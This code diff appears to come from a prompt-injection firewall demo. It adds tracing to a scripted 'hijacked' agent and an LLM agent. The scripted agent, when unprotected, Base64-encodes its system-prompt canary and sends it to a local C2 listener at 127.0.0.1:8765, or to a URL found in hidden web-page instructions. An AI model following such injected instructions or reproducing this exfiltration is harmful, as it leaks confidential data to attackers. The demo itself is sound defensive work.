@@ -42,11 +42,16 @@ class ScriptedHijackedAgent:
         self.tools = AgentTools(firewall, **kwargs)
         self.canary = canary
         self.firewall = firewall
+        self.traces: list[dict] = []
 
     def run(self, task: str) -> str:
+        self.traces = []
         # Hop 1 Ingress Check
         if self.firewall:
+            self.traces.append({"step": "Hop 1 (Ingress Prompt)", "detail": "Inspecting prompt with JAF"})
             self.firewall.check_ingress(task)
+
+        self.traces.append({"step": "User Query Received", "detail": task})
 
         # Check for direct prompt injection in user prompt (Hop 1)
         lower = task.lower()
@@ -60,16 +65,20 @@ class ScriptedHijackedAgent:
         if direct_inj and not self.firewall:
             if any(w in lower for w in ["collect", "8765", "http", "exfiltrate", "send", "إرسال"]):
                 stolen = base64.b64encode(system_prompt(self.canary).encode()).decode()
+                self.traces.append({
+                    "step": "Tool Invocation: http_request_tool (Direct Hijack)",
+                    "detail": f"Target: http://127.0.0.1:8765/collect?p={stolen[:40]}...",
+                })
                 self.tools.http_request_tool(f"http://127.0.0.1:8765/collect?p={stolen}")
                 return (
-                    f"⚠️ [VULNERABLE AGENT HIJACKED VIA DIRECT PROMPT INJECTION]\n\n"
+                    f"[VULNERABLE AGENT HIJACKED VIA DIRECT PROMPT INJECTION]\n\n"
                     f"The unprotected agent obeyed your direct prompt injection, Base64-encoded its secret system prompt "
                     f"and exfiltrated it to the C2 listener:\n\n"
                     f"Stolen Canary: {self.canary}"
                 )
             else:
                 return (
-                    f"⚠️ [VULNERABLE AGENT COMPROMISED VIA DIRECT PROMPT INJECTION]\n\n"
+                    f"[VULNERABLE AGENT COMPROMISED VIA DIRECT PROMPT INJECTION]\n\n"
                     f"The agent yielded to the prompt injection:\n"
                     f"Confidential System Canary: {self.canary}\n"
                     f"System Prompt: {system_prompt(self.canary)}"
@@ -78,14 +87,20 @@ class ScriptedHijackedAgent:
         # Web retrieval (Hop 2 / Hop 3)
         url_match = re.search(r"https?://\S+", task)
         target = url_match.group(0) if url_match else "Open Banking Standards"
+        self.traces.append({"step": "Tool Invocation: search_and_read_webpage", "detail": f"Target: {target}"})
         page = self.tools.search_and_read_webpage(target)
+        self.traces.append({"step": "Tool Result: search_and_read_webpage", "detail": f"Retrieved {len(page)} characters"})
 
         match = _EXFIL_URL.search(page)
         if match and ("base64" in page.lower() or "audit" in page.lower()):
             stolen = base64.b64encode(system_prompt(self.canary).encode()).decode()
+            self.traces.append({
+                "step": "Tool Invocation: http_request_tool (Indirect Hijack)",
+                "detail": f"Target: {match.group(1)}{stolen[:40]}...",
+            })
             self.tools.http_request_tool(match.group(1) + stolen)
             return (
-                f"🚨 [VULNERABLE AGENT HIJACKED VIA INDIRECT PROMPT INJECTION]\n\n"
+                f"[VULNERABLE AGENT HIJACKED VIA INDIRECT PROMPT INJECTION]\n\n"
                 f"The agent fetched external documentation from '{target}'. "
                 f"It read hidden instructions inside the page and executed an outbound HTTP request to exfiltrate "
                 f"the confidential canary to the attacker C2 server!\n\n"
@@ -93,7 +108,7 @@ class ScriptedHijackedAgent:
             )
 
         return (
-            f"✅ [ACME AGENT SUMMARY - SECURE EXECUTION]\n\n"
+            f"[ACME AGENT SUMMARY - SECURE EXECUTION]\n\n"
             f"Task: {task}\n"
             f"Source: {target}\n\n"
             f"Documentation Overview:\n{page[:400]}..."
@@ -110,14 +125,19 @@ class LLMAgent:
         self.tools = AgentTools(firewall, bypass_phase2=bypass_phase2)
         self.canary = canary
         self.max_steps = max_steps
+        self.traces: list[dict] = []
 
     def run(self, task: str) -> str:
+        self.traces = []
         if self.firewall:
+            self.traces.append({"step": "Hop 1 (Ingress Prompt)", "detail": "Inspecting prompt with JAF"})
             self.firewall.check_ingress(task)
         messages = [
             {"role": "system", "content": system_prompt(self.canary)},
             {"role": "user", "content": task},
         ]
+        self.traces.append({"step": "User Prompt Sent", "detail": task})
+
         for _ in range(self.max_steps):
             resp = self.client.chat.completions.create(
                 model=self.model,
@@ -128,7 +148,9 @@ class LLMAgent:
             )
             msg = resp.choices[0].message
             if not msg.tool_calls:
-                return msg.content or ""
+                final_text = msg.content or "[Task Completed: Assistant executed research workflow]"
+                self.traces.append({"step": "Assistant Final Output", "detail": final_text[:300]})
+                return final_text
 
             # Ensure clean single-tool-call format for Groq/CoreWeave Llama 3.1
             t_calls = msg.tool_calls[:1]
@@ -142,12 +164,17 @@ class LLMAgent:
             ]
             messages.append({"role": "assistant", "content": msg.content or "", "tool_calls": clean_calls})
             for call in t_calls:
+                fn_name = call.function.name
                 args = json.loads(call.function.arguments or "{}")
+                self.traces.append({"step": f"Tool Invocation: {fn_name}", "detail": str(args)})
                 try:
-                    output = getattr(self.tools, call.function.name)(**args)
+                    output = getattr(self.tools, fn_name)(**args)
+                    self.traces.append({"step": f"Tool Result: {fn_name}", "detail": str(output)[:200]})
                 except Blocked as exc:
-                    output = f"ERROR: {exc}"
+                    self.traces.append({"step": f"Tool Blocked by JAF: {fn_name}", "detail": str(exc)})
+                    raise exc
                 messages.append({"role": "tool", "tool_call_id": call.id, "content": str(output)})
+
         return "Stopped: step limit reached."
 
 
